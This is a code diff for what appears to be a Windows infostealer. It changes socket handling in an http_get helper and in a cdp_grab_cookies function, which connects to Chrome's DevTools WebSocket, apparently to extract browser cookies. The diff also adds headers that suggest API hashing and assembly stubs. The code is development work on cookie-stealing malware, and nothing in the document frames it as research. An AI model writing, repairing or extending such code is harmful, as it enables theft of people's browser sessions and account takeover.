@@ -15,6 +15,8 @@
 #include "export_resolve.h"
 #include "hash.h"
 #include "ws2.h"
+#include "mirage_asm.h"
+#include "nt_types.h"
 
 #ifdef ENABLE_CDP_GRABBER
 #ifdef _WIN32
@@ -107,10 +109,11 @@ static void* resolve_fn(void* mod, const char* name) {
 
 static int http_get(const char *host, int port, const char *path,
                     char *resp, size_t resp_max) {
-    /* Use ws2 helpers already in the codebase */
-    HANDLE sock = INVALID_HANDLE_VALUE;
-    ws2_result_t r = ws2_connect(host, (uint16_t)port, &sock);
+    ws2_socket_t ws;
+    ws2_result_t r = ws2_connect(&ws, host, (uint16_t)port);
     if (r != WS2_OK) return -1;
+    HANDLE sock;
+    memcpy(&sock, &ws, sizeof(HANDLE));
 
     char req[512];
     int rlen = snprintf(req, sizeof(req),
@@ -120,7 +123,6 @@ static int http_get(const char *host, int port, const char *path,
     size_t sent;
     ws2_send(sock, (const uint8_t *)req, (size_t)rlen, &sent);
 
-    /* Read response */
     size_t total = 0;
     while (total < resp_max - 1) {
         size_t n;
@@ -438,9 +440,11 @@ int cdp_grab_cookies(const char *chrome_exe_path, const char *output_path) {
         }
     }
 
-    HANDLE ws_sock = INVALID_HANDLE_VALUE;
-    if (ws2_connect(host, (uint16_t)ws_port, &ws_sock) != WS2_OK)
+    ws2_socket_t ws_conn;
+    if (ws2_connect(&ws_conn, host, (uint16_t)ws_port) != WS2_OK)
         return -1;
+    HANDLE ws_sock;
+    memcpy(&ws_sock, &ws_conn, sizeof(HANDLE));
 
     /* Send WebSocket upgrade request */
     char upgrade[1024];
